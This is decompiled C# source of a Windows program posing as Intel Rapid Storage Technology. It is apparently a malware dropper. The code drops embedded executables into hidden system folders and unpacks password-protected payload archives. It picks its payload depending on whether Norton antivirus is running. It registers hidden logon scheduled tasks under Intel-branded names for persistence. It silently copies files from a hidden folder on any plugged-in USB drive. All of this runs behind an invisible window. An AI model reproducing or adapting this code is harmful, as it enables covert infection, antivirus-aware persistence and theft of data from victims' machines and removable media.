using System;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.Remoting.Messaging;
using System.Security.Principal;
using System.Windows.Forms;
using ICSharpCode.SharpZipLib.Core;
using ICSharpCode.SharpZipLib.Zip;
using IntelRST.Properties;
using Microsoft.Win32.TaskScheduler;

namespace IntelRST;

public class Form1 : Form
{
	public delegate void Delegate_getcompdatafromflash(string flashpath);

	private IContainer components;

	public Form1()
	{
		//IL_03be: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e8: Unknown result type (might be due to invalid IL or missing references)
		InitializeComponent();
		try
		{
			fun_harddisk();
			Assembly executingAssembly = Assembly.GetExecutingAssembly();
			string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
			string[] array = manifestResourceNames;
			foreach (string text in array)
			{
				if (text.Contains("TaskScheduler.dll"))
				{
					Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(text);
					using (FileStream fileStream = new FileStream(Settings.Default.DriveStorage + "\\Microsoft.Win32.TaskScheduler.dll", FileMode.Create))
					{
						for (int j = 0; j < manifestResourceStream.Length; j++)
						{
							fileStream.WriteByte((byte)manifestResourceStream.ReadByte());
						}
						fileStream.Close();
					}
					if (!File.Exists(Settings.Default.Scout + "\\Microsoft.Win32.TaskScheduler.dll"))
					{
						File.Copy(Settings.Default.DriveStorage + "\\Microsoft.Win32.TaskScheduler.dll", Settings.Default.Scout + "\\Microsoft.Win32.TaskScheduler.dll");
					}
				}
				if (text.Contains("Information"))
				{
					Stream manifestResourceStream2 = executingAssembly.GetManifestResourceStream(text);
					using (FileStream fileStream2 = new FileStream(Settings.Default.DriveStorage + "\\Information.zip", FileMode.Create))
					{
						for (int k = 0; k < manifestResourceStream2.Length; k++)
						{
							fileStream2.WriteByte((byte)manifestResourceStream2.ReadByte());
						}
						fileStream2.Close();
					}
					if (!File.Exists(Settings.Default.Scout + "\\Information.zip"))
					{
						File.Copy(Settings.Default.DriveStorage + "\\Information.zip", Settings.Default.Scout + "\\Information.zip");
					}
				}
				if (text.Contains("code"))
				{
					Stream manifestResourceStream3 = executingAssembly.GetManifestResourceStream(text);
					using (FileStream fileStream3 = new FileStream(Settings.Default.DriveStorage + "\\code.txt", FileMode.Create))
					{
						for (int l = 0; l < manifestResourceStream3.Length; l++)
						{
							fileStream3.WriteByte((byte)manifestResourceStream3.ReadByte());
						}
						fileStream3.Close();
					}
					if (!File.Exists(Settings.Default.Scout + "\\code.txt"))
					{
						File.Copy(Settings.Default.DriveStorage + "\\code.txt", Settings.Default.Scout + "\\code.txt");
					}
				}
				if (!text.Contains("scout") || File.Exists(Settings.Default.Scout + "\\scout.exe"))
				{
					continue;
				}
				Stream manifestResourceStream4 = executingAssembly.GetManifestResourceStream(text);
				using FileStream fileStream4 = new FileStream(Settings.Default.Scout + "\\scout.exe", FileMode.Create);
				for (int m = 0; m < manifestResourceStream4.Length; m++)
				{
					fileStream4.WriteByte((byte)manifestResourceStream4.ReadByte());
				}
				fileStream4.Close();
			}
			fun_ExtractFile();
			if (fun_avg_norton())
			{
				fun_extractfile("frmmem.exe", "frmmem.exe");
				fun_taskschedular(Path.Combine(Settings.Default.DriveStorage, "frmmem.exe"), "Intel Rapid Storage Technology", "Intel® RST", 3.0);
			}
			else
			{
				fun_extractfile("IntelRST.exe", "IntelRST.exe");
				fun_taskschedular(Path.Combine(Settings.Default.DriveStorage, "IntelRST.exe"), "Intel Rapid Storage Technology", "Intel® RST", 3.0);
			}
			fun_taskschedular(Path.Combine(Settings.Default.Scout, "scout.exe"), "Monitor and repair", "scout", 2.0);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString() + "inner = " + ex.InnerException);
		}
		try
		{
			Environment.Exit(1);
		}
		catch (Exception ex2)
		{
			MessageBox.Show(ex2.ToString() + "inner = " + ex2.InnerException);
		}
	}

	private void fun_harddisk()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		if (!Directory.Exists(folderPath + "\\scout"))
		{
			Directory.CreateDirectory(folderPath + "\\scout");
			Settings.Default.Scout = folderPath + "\\scout";
			((SettingsBase)Settings.Default).Save();
		}
		if (!Directory.Exists(folderPath + "\\Intel"))
		{
			Directory.CreateDirectory(folderPath + "\\Intel");
			Settings.Default.DriveStorage = folderPath + "\\Intel\\Intel Volume";
			((SettingsBase)Settings.Default).Save();
		}
		else
		{
			Settings.Default.DriveStorage = folderPath + "\\Intel\\Intel Volume";
			((SettingsBase)Settings.Default).Save();
		}
		if (!Directory.Exists(Settings.Default.DriveStorage))
		{
			Directory.CreateDirectory(Settings.Default.DriveStorage);
			DirectoryInfo directoryInfo = new DirectoryInfo(Settings.Default.DriveStorage);
			directoryInfo.Attributes = FileAttributes.Hidden;
			directoryInfo.Attributes = FileAttributes.System;
			directoryInfo.Attributes = FileAttributes.ReadOnly;
			string path = Path.Combine(Settings.Default.DriveStorage, "Lab");
			Directory.CreateDirectory(path);
			string zStorage = Path.Combine(Settings.Default.DriveStorage, "z");
			Settings.Default.zStorage = zStorage;
			((SettingsBase)Settings.Default).Save();
			Directory.CreateDirectory(Settings.Default.zStorage);
		}
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.DriveType.Equals(DriveType.Removable))
			{
				string text = driveInfo.Name + "\\$System Volume Information";
				if (Directory.Exists(text))
				{
					Delegate_getcompdatafromflash delegate_getcompdatafromflash = fun_getcompdatafromflash;
					delegate_getcompdatafromflash.BeginInvoke(text, Delegate_getcompdatafromflash_CallBack, null);
				}
			}
		}
	}

	private void fun_getcompdatafromflash(string flashpath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(flashpath);
		FileInfo[] files = directoryInfo.GetFiles();
		FileInfo[] array = files;
		foreach (FileInfo fileInfo in array)
		{
			File.Copy(fileInfo.FullName, Settings.Default.zStorage + "\\" + fileInfo.Name);
		}
	}

	private static void fun_taskschedular(string str_path, string description, string str2, double time)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ce: Expected O, but got Unknown
		//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d5: Expected O, but got Unknown
		//IL_00f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_0101: Expected O, but got Unknown
		TaskService val = new TaskService();
		try
		{
			string name = WindowsIdentity.GetCurrent().Name;
			Version highestSupportedVersion = val.get_HighestSupportedVersion();
			bool flag = highestSupportedVersion >= new Version(1, 2);
			TaskDefinition val2 = val.NewTask();
			val2.get_Principal().set_UserId(name);
			val2.get_Principal().set_LogonType((TaskLogonType)3);
			val2.get_Settings().set_DisallowStartIfOnBatteries(false);
			val2.get_RegistrationInfo().set_Description(description);
			val2.get_Settings().set_DisallowStartIfOnBatteries(false);
			val2.get_Settings().set_Hidden(true);
			val2.get_Settings().set_RunOnlyIfIdle(false);
			val2.get_Settings().set_RunOnlyIfNetworkAvailable(false);
			val2.get_Settings().set_StopIfGoingOnBatteries(false);
			val2.get_Settings().set_WakeToRun(false);
			val2.get_Settings().set_AllowHardTerminate(false);
			LogonTrigger val3 = (LogonTrigger)val2.get_Triggers().Add((Trigger)new LogonTrigger());
			if (flag)
			{
				val3.set_Delay(TimeSpan.FromMinutes(time));
				val3.set_UserId(name);
			}
			val2.get_Actions().Add((Action)new ExecAction(str_path, (string)null, (string)null));
			TaskFolder rootFolder = val.get_RootFolder();
			rootFolder.RegisterTaskDefinition(str2, val2, (TaskCreation)6, (string)null, (string)null, (TaskLogonType)3, (string)null);
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	public void fun_ExtractFile()
	{
		string path = Settings.Default.DriveStorage + "\\Information.zip";
		string text = "abc!@#";
		string path2 = Settings.Default.DriveStorage + "\\";
		ZipFile zipFile = null;
		try
		{
			FileStream file = File.OpenRead(path);
			zipFile = new ZipFile(file);
			if (!string.IsNullOrEmpty(text))
			{
				zipFile.Password = text;
			}
			foreach (ZipEntry item in zipFile)
			{
				if (item.IsFile)
				{
					string name = item.Name;
					byte[] buffer = new byte[4096];
					Stream inputStream = zipFile.GetInputStream(item);
					string path3 = Path.Combine(path2, name);
					string directoryName = Path.GetDirectoryName(path3);
					if (directoryName.Length > 0)
					{
						Directory.CreateDirectory(directoryName);
					}
					using FileStream destination = File.Create(path3);
					StreamUtils.Copy(inputStream, destination, buffer);
				}
			}
		}
		finally
		{
			if (zipFile != null)
			{
				zipFile.IsStreamOwner = true;
				zipFile.Close();
			}
		}
	}

	private bool fun_avg_norton()
	{
		bool result = false;
		try
		{
			Process[] processesByName = Process.GetProcessesByName("nst");
			Process[] processesByName2 = Process.GetProcessesByName("nav");
			if (processesByName.Length <= 0 && processesByName2.Length <= 0)
			{
				result = false;
				return result;
			}
			result = true;
			return result;
		}
		catch (Exception)
		{
			return result;
		}
	}

	private void fun_extractfile(string entrypoint, string filename)
	{
		string password = "abc!@#";
		using FileStream file = new FileStream(Settings.Default.DriveStorage + "\\IntelRST.zip", FileMode.Open, FileAccess.Read);
		using ZipFile zipFile = new ZipFile(file);
		zipFile.Password = password;
		ZipEntry entry = zipFile.GetEntry(entrypoint);
		if (entry == null)
		{
			throw new ArgumentException("IntelRST.exe", "not found in Zip");
		}
		byte[] buffer = new byte[4096];
		Stream inputStream = zipFile.GetInputStream(entry);
		string path = Settings.Default.DriveStorage + "\\" + filename;
		Path.GetDirectoryName(path);
		using FileStream destination = File.Create(path);
		StreamUtils.Copy(inputStream, destination, buffer);
	}

	private void Delegate_getcompdatafromflash_CallBack(IAsyncResult ar)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		AsyncResult val = (AsyncResult)ar;
		Delegate_getcompdatafromflash delegate_getcompdatafromflash = (Delegate_getcompdatafromflash)val.get_AsyncDelegate();
		delegate_getcompdatafromflash.EndInvoke(ar);
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((ContainerControl)this).set_AutoValidate((AutoValidate)0);
		((Control)this).set_CausesValidation(false);
		((Form)this).set_ClientSize(new Size(1, 1));
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
	}
}
